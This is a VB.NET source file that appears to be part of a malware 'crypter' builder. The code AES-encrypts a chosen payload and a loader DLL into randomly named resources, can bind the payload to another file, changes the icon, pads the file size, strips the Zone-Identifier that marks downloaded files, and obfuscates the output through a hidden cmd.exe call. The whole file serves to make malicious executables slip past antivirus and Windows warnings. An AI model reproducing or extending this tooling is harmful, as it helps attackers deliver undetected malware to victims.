﻿Imports System.CodeDom.Compiler

Public Class Codedom
    Public Shared ResName As String = Helper.Randomi(Helper.rand.Next(6, 12))
    Public Shared ResPayload = Helper.Randomi(Helper.rand.Next(5, 10))
    Public Shared ResDLL = Helper.Randomi(Helper.rand.Next(5, 10))
    Public Shared ResBind = Helper.Randomi(Helper.rand.Next(5, 10))

    Public Shared Sub Compiler(ByVal Path As String, ByVal Code As String)
        Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions += "/platform:X86 /target:winexe"
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("system.data.dll")
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("system.dll")
            .ReferencedAssemblies.Add("system.Deployment.dll")
            .ReferencedAssemblies.Add("System.Drawing.dll")
            .ReferencedAssemblies.Add("System.Web.dll")
            .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")

            .ReferencedAssemblies.Add(Process.GetCurrentProcess().MainModule.FileName)
            .ReferencedAssemblies.Add(Application.ExecutablePath)

            Dim rw As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + ResName + ".Resources")
            rw.AddResource(ResPayload, Algorithm.AES_Encrypt(Algorithm.Bytes_To_String(IO.File.ReadAllBytes(Main.txtPayload.Text)), Main.Key))
            rw.AddResource(ResDLL, Algorithm.AES_Encrypt(Algorithm.Bytes_To_String(My.Resources.PE), Main.Key))
            If Main.chkBind.Checked = True AndAlso IO.File.Exists(Main.txtBind.Text) = True Then
                rw.AddResource(ResBind, Algorithm.AES_Encrypt(Algorithm.Bytes_To_String(IO.File.ReadAllBytes(Main.txtBind.Text)), Main.Key))

            End If
            rw.Close()
            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + ResName + ".Resources")

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    Main.txtLog.AppendText(E.ErrorText)
                Next
            Else

                If Main.chkIcon.Checked = True AndAlso Main.picIcon.ImageLocation <> "" Then
                    Main.txtLog.AppendText("Changing Icon..." + Environment.NewLine)
                    IconInjector.InjectIcon(Main.OutputPayload, Main.picIcon.ImageLocation)
                End If

                If Main.chkPump.Checked = True Then
                    Main.txtLog.AppendText("Pumping..." + Environment.NewLine)
                    Helper.Pumper(Main.OutputPayload)
                End If

                If Main.chkZoneIden.Checked = True Then
                    Main.txtLog.AppendText("Deleting Zone-Identifier..." + Environment.NewLine)
                    Helper.DeleteZoneIdentifier(Main.OutputPayload)
                End If

                IO.File.WriteAllBytes(IO.Path.GetTempPath + "\dotNET_Reactor.exe", My.Resources.dotNET_Reactor1)
                Dim Info As ProcessStartInfo = New ProcessStartInfo()
                Info.Arguments = "/C dotNET_Reactor.exe -file """ & Main.OutputPayload & """ -antitamp 1  -obfuscation 1 -antitamp  1 -targetfile """ & Main.OutputPayload & """"
                Info.WindowStyle = ProcessWindowStyle.Hidden
                Info.CreateNoWindow = True
                Info.WorkingDirectory = IO.Path.GetTempPath
                Info.FileName = "cmd.exe"
                Process.Start(Info)

                Threading.Thread.Sleep(2500)
                Dim PayloadSize As New IO.FileInfo(Main.OutputPayload)
                Dim sizeInBytes As Long = PayloadSize.Length / 1024
                Main.txtLog.AppendText("Done! Crypted file final size is " + sizeInBytes.ToString + " KB" + Environment.NewLine)
            End If
        End With

        Try
            IO.File.Delete(IO.Path.GetTempPath + "\" + ResName + ".Resources")
            IO.File.Delete(Application.StartupPath + "\" + IO.Path.GetFileName(Main.OutputPayload) + ".hash")
        Catch ex As Exception
        End Try

    End Sub


End Class
